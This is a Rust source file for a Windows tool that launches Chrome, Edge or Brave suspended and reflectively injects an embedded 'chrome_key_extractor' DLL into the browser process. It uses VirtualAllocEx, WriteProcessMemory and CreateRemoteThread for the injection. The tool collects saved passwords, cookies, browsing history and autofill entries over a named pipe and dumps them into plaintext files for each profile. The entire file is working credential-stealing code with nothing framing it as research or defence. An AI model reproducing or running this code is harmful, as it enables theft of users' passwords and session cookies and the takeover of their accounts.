use clap::Parser;
use serde::{Deserialize, Serialize};
use std::fs;
use std::io::Write;
use std::path::Path;
use std::ptr;

#[cfg(windows)]
use windows_sys::Win32::Foundation::*;
#[cfg(windows)]
use windows_sys::Win32::Storage::FileSystem::*;
#[cfg(windows)]
use windows_sys::Win32::System::Diagnostics::Debug::*;
#[cfg(windows)]
use windows_sys::Win32::System::Memory::*;
#[cfg(windows)]
use windows_sys::Win32::System::Pipes::*;
#[cfg(windows)]
use windows_sys::Win32::System::Threading::*;

#[cfg(not(windows))]
#[allow(non_snake_case, non_camel_case_types)]
pub mod win_stubs {
    pub type HANDLE = isize;
    pub type HWND = isize;
    pub type BOOL = i32;
    pub const INVALID_HANDLE_VALUE: HANDLE = -1;
    #[repr(C)] pub struct STARTUPINFOW { pub cb: u32, pub lpReserved: *mut u16, pub lpDesktop: *mut u16, pub lpTitle: *mut u16, pub dwX: u32, pub dwY: u32, pub dwXSize: u32, pub dwYSize: u32, pub dwXCountChars: u32, pub dwYCountChars: u32, pub dwFillAttribute: u32, pub dwFlags: u32, pub wShowWindow: u16, pub cbReserved2: u16, pub lpReserved2: *mut u8, pub hStdInput: HANDLE, pub hStdOutput: HANDLE, pub hStdError: HANDLE }
    #[repr(C)] pub struct PROCESS_INFORMATION { pub hProcess: HANDLE, pub hThread: HANDLE, pub dwProcessId: u32, pub dwThreadId: u32 }
    pub const CREATE_SUSPENDED: u32 = 0x00000004;
    pub const MEM_COMMIT: u32 = 0x1000;
    pub const MEM_RESERVE: u32 = 0x2000;
    pub const MEM_RELEASE: u32 = 0x8000;
    pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    pub const PIPE_ACCESS_INBOUND: u32 = 1;
    pub const PIPE_TYPE_MESSAGE: u32 = 4;
    pub const PIPE_READMODE_MESSAGE: u32 = 2;
    pub const PIPE_WAIT: u32 = 0;
    pub const ERROR_PIPE_CONNECTED: u32 = 535;
    pub const ERROR_MORE_DATA: u32 = 234;

    pub unsafe fn CreateProcessW(_: *const u16, _: *mut u16, _: *mut (), _: *mut (), _: i32, _: u32, _: *mut (), _: *const u16, _: *mut STARTUPINFOW, _: *mut PROCESS_INFORMATION) -> BOOL { 0 }
    pub unsafe fn GetLastError() -> u32 { 0 }
    pub unsafe fn CloseHandle(_: HANDLE) -> BOOL { 0 }
    pub unsafe fn VirtualAllocEx(_: HANDLE, _: *const (), _: usize, _: u32, _: u32) -> *mut () { std::ptr::null_mut() }
    pub unsafe fn VirtualFreeEx(_: HANDLE, _: *mut (), _: usize, _: u32) -> BOOL { 0 }
    pub unsafe fn WriteProcessMemory(_: HANDLE, _: *const (), _: *const (), _: usize, _: *mut usize) -> BOOL { 0 }
    pub unsafe fn CreateRemoteThread(_: HANDLE, _: *const (), _: usize, _: Option<unsafe extern "system" fn(*mut ()) -> u32>, _: *const (), _: u32, _: *mut u32) -> HANDLE { 0 }
    pub unsafe fn ResumeThread(_: HANDLE) -> u32 { 0 }
    pub unsafe fn CreateNamedPipeW(_: *const u16, _: u32, _: u32, _: u32, _: u32, _: u32, _: u32, _: *const ()) -> HANDLE { INVALID_HANDLE_VALUE }
    pub unsafe fn ConnectNamedPipe(_: HANDLE, _: *mut ()) -> BOOL { 0 }
    pub unsafe fn ReadFile(_: HANDLE, _: *mut (), _: u32, _: *mut u32, _: *mut ()) -> BOOL { 0 }
    pub unsafe fn TerminateProcess(_: HANDLE, _: u32) -> BOOL { 0 }
    pub unsafe fn WaitForSingleObject(_: HANDLE, _: u32) -> u32 { 0 }
}

#[cfg(not(windows))]
use win_stubs::*;

#[derive(Serialize, Deserialize, Debug)]
struct PasswordData { url: String, username: String, password: String }
#[derive(Serialize, Deserialize, Debug)]
struct CookieData { host: String, name: String, value: String }
#[derive(Serialize, Deserialize, Debug)]
struct HistoryData { url: String, title: String, visit_count: i32 }
#[derive(Serialize, Deserialize, Debug)]
struct AutofillData { name: String, value: String }
#[derive(Serialize, Deserialize, Debug)]
struct ProfileData {
    name: String,
    passwords: Vec<PasswordData>,
    cookies: Vec<CookieData>,
    history: Vec<HistoryData>,
    autofill: Vec<AutofillData>,
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    #[arg(short, long, default_value = "")]
    dll: String,
    #[arg(short, long, default_value = "all")]
    browser: String,
}

struct BrowserConfig { name: &'static str, exe_name: &'static str, common_paths: &'static [&'static str] }
const BROWSERS: &[BrowserConfig] = &[
    BrowserConfig { name: "Chrome", exe_name: "chrome.exe", common_paths: &[ r"C:\Program Files\Google\Chrome\Application\chrome.exe", r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" ] },
    BrowserConfig { name: "Edge", exe_name: "msedge.exe", common_paths: &[ r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", r"C:\Program Files\Microsoft\Edge\Application\msedge.exe" ] },
    BrowserConfig { name: "Brave", exe_name: "brave.exe", common_paths: &[ r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe", r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe" ] },
];

#[cfg(target_os = "windows")]
const DLL_BYTES: &[u8] = include_bytes!("../../proxydll/target/release/chrome_key_extractor.dll");
#[cfg(not(target_os = "windows"))]
const DLL_BYTES: &[u8] = include_bytes!("../../proxydll/target/release/libchrome_key_extractor.so");

fn to_wide(s: &str) -> Vec<u16> { s.encode_utf16().chain(std::iter::once(0)).collect() }

fn find_browser_exe(name: &str) -> Option<String> {
    let config = BROWSERS.iter().find(|b| b.name.to_lowercase() == name.to_lowercase())?;
    for path in config.common_paths { if std::path::Path::new(path).exists() { return Some(path.to_string()); } }
    None
}

fn inject_and_collect(dll_bytes: &[u8], browser_config: &BrowserConfig) {
    println!("\n--- Processing Browser: {} ---", browser_config.name);
    let mut cmd_line = to_wide(browser_config.exe_name);
    unsafe {
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();
        let mut success = CreateProcessW(ptr::null(), cmd_line.as_mut_ptr(), ptr::null_mut(), ptr::null_mut(), 0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null(), &mut startup_info, &mut process_info);
        if success == 0 {
            if let Some(path) = find_browser_exe(browser_config.name) {
                let mut cmd_full = to_wide(&path);
                success = CreateProcessW(cmd_full.as_ptr(), cmd_full.as_mut_ptr(), ptr::null_mut(), ptr::null_mut(), 0, CREATE_SUSPENDED, ptr::null_mut(), ptr::null(), &mut startup_info, &mut process_info);
            }
        }
        if success == 0 { eprintln!("Failed to create {} process", browser_config.exe_name); return; }
        let (ph, th) = (process_info.hProcess, process_info.hThread);
        let pe = goblin::pe::PE::parse(dll_bytes).expect("Failed to parse DLL");
        let offset = pe.exports.iter().find(|e| e.name == Some("ReflectiveLoader")).and_then(|e| e.offset).expect("ReflectiveLoader missing") as u32;
        let remote_mem = VirtualAllocEx(ph, ptr::null(), dll_bytes.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if remote_mem.is_null() { eprintln!("Alloc failed"); TerminateProcess(ph, 0); CloseHandle(ph); CloseHandle(th); return; }
        WriteProcessMemory(ph, remote_mem, dll_bytes.as_ptr() as *const _, dll_bytes.len(), ptr::null_mut());
        let remote_thread = CreateRemoteThread(ph, ptr::null(), 0, Some(std::mem::transmute((remote_mem as usize + offset as usize) as *const ())), remote_mem, 0, ptr::null_mut());
        let pipe_name = to_wide(r"\\.\pipe\chrome_extractor");
        let pipe_handle = CreateNamedPipeW(pipe_name.as_ptr(), PIPE_ACCESS_INBOUND, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, 1, 65536, 65536, 0, ptr::null());
        ResumeThread(th);
        if pipe_handle != INVALID_HANDLE_VALUE {
            if ConnectNamedPipe(pipe_handle, ptr::null_mut()) != 0 || GetLastError() == ERROR_PIPE_CONNECTED {
                let mut buffer = Vec::new(); let mut temp_buffer = [0u8; 8192];
                loop {
                    let mut br = 0; let success = ReadFile(pipe_handle, temp_buffer.as_mut_ptr() as *mut _, temp_buffer.len() as u32, &mut br, ptr::null_mut());
                    if (success != 0 || GetLastError() == ERROR_MORE_DATA) && br > 0 { buffer.extend_from_slice(&temp_buffer[..br as usize]); if success != 0 { break; } } else { break; }
                }
                if let Ok(profiles) = serde_json::from_slice::<Vec<ProfileData>>(&buffer) {
                    let _ = fs::create_dir_all(browser_config.name);
                    for (i, p) in profiles.into_iter().enumerate() {
                        let dir = Path::new(browser_config.name).join(format!("profile {}", i + 1)); let _ = fs::create_dir_all(&dir);
                        if let Ok(mut f) = fs::File::create(dir.join("password.txt")) { for x in p.passwords { let _ = writeln!(f, "URL: {}\nUser: {}\nPass: {}\n", x.url, x.username, x.password); } }
                        if let Ok(mut f) = fs::File::create(dir.join("cookie.txt")) { for x in p.cookies { let _ = writeln!(f, "Host: {} | Name: {} | Value: {}", x.host, x.name, x.value); } }
                        if let Ok(mut f) = fs::File::create(dir.join("history.txt")) { for x in p.history { let _ = writeln!(f, "URL: {} | Title: {} | Visits: {}", x.url, x.title, x.visit_count); } }
                        if let Ok(mut f) = fs::File::create(dir.join("autofill.txt")) { for x in p.autofill { let _ = writeln!(f, "Name: {} | Value: {}", x.name, x.value); } }
                    }
                }
            }
            CloseHandle(pipe_handle);
        }
        WaitForSingleObject(remote_thread, 5000); CloseHandle(remote_thread); VirtualFreeEx(ph, remote_mem, 0, MEM_RELEASE); TerminateProcess(ph, 0); CloseHandle(ph); CloseHandle(th);
    }
}

fn main() {
    let args = Args::parse();
    let dll_bytes = if !args.dll.is_empty() { fs::read(&args.dll).expect("Failed to read DLL") } else { DLL_BYTES.to_vec() };
    if args.browser.to_lowercase() == "all" { for c in BROWSERS { inject_and_collect(&dll_bytes, c); } }
    else if let Some(c) = BROWSERS.iter().find(|b| b.name.to_lowercase() == args.browser.to_lowercase()) { inject_and_collect(&dll_bytes, c); }
}
